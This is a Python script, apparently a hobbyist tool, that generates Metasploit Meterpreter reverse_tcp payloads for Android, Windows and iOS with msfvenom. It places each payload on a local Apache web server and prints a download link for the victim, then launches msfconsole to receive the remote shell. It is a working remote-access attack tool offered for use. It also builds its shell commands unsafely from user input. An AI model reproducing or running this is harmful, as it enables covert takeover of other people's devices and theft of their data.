import subprocess, termcolor, time, sys, os
from termcolor import colored
from tqdm import tqdm
import colorama
from colorama import Fore, Back, Style
time.sleep(1)
subprocess.run('clear', shell=True)
print(Style.BRIGHT + Fore.CYAN + """
,--.   ,--.        ,---.                      ,--.     
|   `.'   | ,---. /  .-',-----. ,--,--. ,---. |  |,-.  
|  |'.'|  |(  .-' |  `-,'-----'' ,-.  || .-. ||     /  
|  |   |  |.-'  `)|  .-'       \ '-'  || '-' '|  \  \  
`--'   `--'`----' `--'          `--`--'|  |-' `--'`--' 
                                       `--'            
""")
for _ in tqdm(range(200),

    desc = "loading Msf-apk...",
    ascii = False,ncols=100):
    time.sleep(0.1)
print(Fore.BLUE + "MSF-APK for android/ios/windows")

time.sleep(1)
print(Fore.CYAN + "[+]make your payload")
print(Style.BRIGHT + Fore.WHITE + "[+] NOTE! this is if you already have a connection with the phone and/or computer you want to reconnect to.")
msf = input(Style.BRIGHT + Fore.WHITE + "[+] do you want to start metasploit [y/n] ")
if msf == "y":
   print("----------------------------------------------------------")
   print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
   subprocess.run('msfconsole -q', shell=True)
   sys.exit()
else:
    print(Style.BRIGHT + Fore.BLUE + "ok moving on")
    time.sleep(1)

answer = input(Fore.YELLOW + "do you want to edit the apche2 ports.conf and apache2.conf file[y/n] ")
if answer == "y":
   print(Fore.YELLOW + "ok! editing file")
   time.sleep(1)
   subprocess.run('nano /etc/apache2/ports.conf', shell=True)
   subprocess.run('nano /etc/apache2/apache2.conf', shell=True)
   print(Style.BRIGHT + Fore.GREEN + "Saved!")
   time.sleep(1)
else:
    print(Style.BRIGHT + Fore.GREEN + "ok! saving file")

    print(Fore.RED + """
    [1] android android/meterpreter/reverse_tcp
    [2] windows windows/meterpreter/reverse_tcp
    [3] ios apple_ios/armle/meterpreter_reverse_tcp
    [99] quit
""")
payload_method  = str(input("payload: "))
def menu():
    if payload_method == "1":
           os.system('clear')
           print(Style.BRIGHT + Fore.CYAN + """
  ,---.             ,--.              ,--.   ,--. 
 /  O  \ ,--,--,  ,-|  |,--.--. ,---. `--' ,-|  | 
|  .-.  ||      \' .-. ||  .--'| .-. |,--.' .-. | 
|  | |  ||  ||  |\ `-' ||  |   ' '-' '|  |\ `-' | 
`--' `--'`--''--' `---' `--'    `---' `--' `---'  

payload: android/meterpreter/reverse_tcp
           """)
           for _ in tqdm(range(100),

               desc = "loading Msf-apk/android...",
               ascii = False,ncols=100):
               time.sleep(0.1)
           ip1 = str(input(Fore.RED + "[+] IP: "))
           port1 = str(input(Fore.RED + "[+] PORT: "))
           output_file1 = str(input(Fore.RED + "[+] OUTPUT FILE NAME: "))
           print(Fore.BLUE + "now wait..")
           subprocess.run('msfvenom -p android/meterpreter/reverse_tcp LHOST='+ip1+' LPORT='+port1+' -o /var/www/html/'+output_file1, shell=True)
           subprocess.run('service apache2 start', shell=True)
           print(Style.BRIGHT + Fore.GREEN + "apache2 is running!")
           print(Fore.RED + "----------------------------------------------------------")
           print(Fore.YELLOW + "original link: http://"+ip1+":2222/"+output_file1+"")
           print(Fore.RED + "----------------------------------------------------------")
           print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
           subprocess.run('msfconsole -q', shell=True)
           print(Fore.RED + "stoping apache2 webserver...")
           subprocess.run('service apache2 stop', shell=True)

    elif payload_method == "2":
             os.system('clear')
             print(Style.BRIGHT + Fore.CYAN + """
,--.   ,--.,--.           ,--.                          
|  |   |  |`--',--,--,  ,-|  | ,---. ,--.   ,--. ,---.  
|  |.'.|  |,--.|      \' .-. || .-. ||  |.'.|  |(  .-'  
|   ,'.   ||  ||  ||  |\ `-' |' '-' '|   .'.   |.-'  `) 
'--'   '--'`--'`--''--' `---'  `---' '--'   '--'`----'  

payload: windows/meterpreter/reverse_tcp
             """)
             for _ in tqdm(range(100),

                 desc = "loading Msf-apk/windows...",
                 ascii = False,ncols=100):
                 time.sleep(0.1)
             ip2 = str(input(Fore.RED + "[+] IP: "))
             port2 = str(input(Fore.RED + "[+] PORT: "))
             output_file2 = str(input(Fore.RED + "[+] OUTPUT FILE NAME: "))
             print(Fore.BLUE + "now wait..")
             subprocess.run('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ip2+' LPORT='+port2+' -o /var/www/html/'+output_file2, shell=True)
             print(Fore.RED + "----------------------------------------------------------")
             print(Fore.YELLOW + "original link: http://"+ip2+":2222/"+output_file2+"")
             print(Fore.RED + "----------------------------------------------------------")
             print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
             subprocess.run('msfconsole -q', shell=True)
             print(Fore.RED + "stoping apache2 webserver...")
             subprocess.run('service apache2 stop', shell=True)

    elif payload_method == "3":
             os.system('clear')
             print(Style.BRIGHT + Fore.CYAN + """
,--.               
|  | ,---.  ,---.  
|  || .-. |(  .-'  
|  |' '-' '.-'  `) 
`--' `---' `----'  

payload: apple_ios/armle/meterpreter_reverse_tcp
             """)
             for _ in tqdm(range(100),

                 desc = "loading Msf-apk/ios...",
                 ascii = False,ncols=100):
                 time.sleep(0.1)
             ip3 = str(input(Fore.RED + "[+] IP: "))
             port3 = str(input(Fore.RED + "[+] PORT: "))
             output_file3 = str(input(Fore.RED + "[+] OUTPUT FILE NAME: "))
             print(Fore.BLUE + "now wait..")
             subprocess.run('msfvenom -p apple_ios/armle/meterpreter_reverse_tcp LHOST='+ip3+' LPORT='+port3+' -o /var/www/html/'+output_file3, shell=True)
             subprocess.run('service apache2 start', shell=True)
             print(Style.BRIGHT + Fore.GREEN + "apache2 is running!")
             print(Fore.RED + "----------------------------------------------------------")
             print(Fore.YELLOW + "original link: http://"+ip3+":2222/"+output_file3+"")
             print(Fore.RED + "----------------------------------------------------------")
             print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
             subprocess.run('msfconsole -q', shell=True)
             print(Fore.RED + "stoping apache2 webserver...")
             subprocess.run('service apache2 stop', shell=True)

    elif payload_method == "99":
             sys.exit('bye bye')

    else:
        print("not the answer")
        menu()

menu()
